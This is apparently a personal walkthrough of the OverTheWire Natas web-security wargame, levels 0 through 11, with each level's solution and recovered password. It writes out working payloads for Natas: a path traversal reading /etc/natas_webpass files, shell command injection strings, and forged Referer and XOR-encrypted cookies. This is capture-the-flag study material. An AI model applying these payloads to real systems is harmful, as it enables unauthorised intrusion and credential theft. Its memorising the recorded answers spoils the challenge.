lvl 0 : 
http://natas0.natas.labs.overthewire.org/
natas0
natas0
// inspect source code
gtVrDuiDfck831PqWsLEZy5gyDz1clto 

lvl 1 --> lvl 2
http://natas1.natas.labs.overthewire.org/
natas1
gtVrDuiDfck831PqWsLEZy5gyDz1clto
// ctrl maj j
    // In elements go for <div id="content">
<!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->


lvl 2 --> lvl 3
http://natas2.natas.labs.overthewire.org/
natas2
ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi
ctrl u
atas2.natas.labs.overthewire.org/files
http://natas2.natas.labs.overthewire.org/files/users.txt
sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14

lvl 3 --> lvl 4
http://natas3.natas.labs.overthewire.org/
sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
http://natas3.natas.labs.overthewire.org/robots.txt
http://natas3.natas.labs.overthewire.org/s3cr3t/
http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ

lvl 4 --> lvl 5
http://natas4.natas.labs.overthewire.org/
Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
// The point of this level is to set the Referer in the Headers to http://natas5.natas.labs.overthewire.org/
// Once done we can access the password
// see natas4.py
iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq

lvl 5 --> lvl 6
http://natas5.natas.labs.overthewire.org/
natas5
iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
// The point of this level is to set the cookie in the session to 1
// define the cookie parameters you want to change cookies = { 'loggedin': '1'}
// to access a cookie go for resquests.Session()
// to send the cookie to your GET request : session.get(url, cookies = cookies)
aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1

lvl 6 --> lvl 7
http://natas6.natas.labs.overthewire.org/
natas6
aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
// The point of this level is to find a secret password to add in an input
// Looking at the source code we see and index-source.html
http://natas6.natas.labs.overthewire.org/index-source.html
// once inside it, we see a php conditional <? code ?>. It states : include "includes/secret.inc"
// Taking a look at this file :  http://natas6.natas.labs.overthewire.org/includes/secret.inc
// We get the secret :
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
// 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9

lvl 7 --> lvl 8
http://natas7.natas.labs.overthewire.org/
natas7
7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
// The point of this level is to test for Local File Inclusion
// Cf. owasp.org : this vulnerability occurs due to thte use of user-supplied input without proper validation. 
// It allows for directory taversal characters (such as dot-dot-slash) to be injected.
// Typically : http://vulnerable_host/preview.php?file=example.html
// We would then go for : http://vulnerable_host/preview.php?file=../../../../etc/passwd
// Here, we have a hint : password for webuser natas8 is in /etc/natas_webpass/natas8
http://natas7.natas.labs.overthewire.org/index.php?page=../../../../etc/natas_webpass/natas8
DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe

lvl 8 --> lvl 9
http://natas8.natas.labs.overthewire.org/
natas8
DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
// The point of this level is to reverse ingineer a password encryption
// Here is the logic :
<?
$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
} 
?>
// PHP logic :
<?php
echo(base64_decode(strrev(hex2bin('3d3d516343746d4d6d6c315669563362'))));
?>
// Result: oubWYf2kBq
// Adding it in the input we obtain : 
W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl

lvl 9 --> lvl 10
http://natas9.natas.labs.overthewire.org/
natas9
W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
// The point of this level is to process a PHP command injection
a /dev/null; # // checks all the files in the folder
// ; # allows to end the request and not get the whole dictionnary.txt back
. /etc/natas_webpass/natas10 #
// note a . with a space '. ' means grep anything 
nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu

lvl 10 --> lvl 11
http://natas10.natas.labs.overthewire.org/
natas10
nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
// The point of this level is to process a PHP command injection escaping a certain set of characters ;|&
// in http://natas10.natas.labs.overthewire.org/index-source.html
//
if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    }
// 
// As such, we can keep the same logic as in lvl9 avoiding ';'
U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK

lvl 11 --> lvl 12
http://natas11.natas.labs.overthewire.org/
natas11
U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
// The point of this level is to access $data, which is inside a cookie => session.cookies
// In python print(session.cookies['data']) or ctrl shift j => application => cookie 
// Then we have to reverse ingineer 'data'
// => $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"]))
ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D
// looking at %3D we know that it is a urlencoded character
urllib.parse.unquote(session.cookies['data'])
// then base64
base64.b64decode(urllib.parse.unquote(session.cookies['data']))
b'\nUK"\x1e\x00H+\x02\x04O%\x03\x13\x1apS\x19Wh]UZ-\x12\x18T%\x03U\x02hR\x11^,\x17\x11^h\x0c'
// then we see from the code that run the code through xor_encrypt() 
function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}
// xor_encryption logic : 
plaintext ^ key = ciphertext
plaintext ^ciphertext = key
// lets figure out the key as we have both the plaintext and the ciphertext
plaintext = json_encode($defaultdata) = {"showpassword":"no","bgcolor":"#ffffff"}
cyphertext (in php) = hex2bin(b'0a554b221e00482b02044f2503131a70531957685d555a2d121854250355026852115e2c17115e680c')

// for reasons beyond my understanding, it seeams that be should hexify our data as it easier to deal with
b'0a554b221e00482b02044f2503131a70531957685d555a2d121854250355026852115e2c17115e680c'

// echo(xor_encrypt($plainText, $cypherText))
// this is supposed to give us our key = 'qw8J'
qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq
// Then we can reverse ingineer it and look for the good cypherText
$good_data = array( "showpassword"=>"yes", "bgcolor"=>"#ffffff");
$good_plainText = json_encode($good_data);
$good_cypherText = xor_encrypt($good_plainText, $key);
echo($good_cypherText)
UK"H+O%pS]9S[(W&pST^,^,S
"// From the file, we have to then base64_encode it  
function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}
//
$cookie = base64_encode($good_cypherText);
echo($cookie);
ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK
// Now that we have the data, we have to send it with the cookie, see natas.py
EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3<br>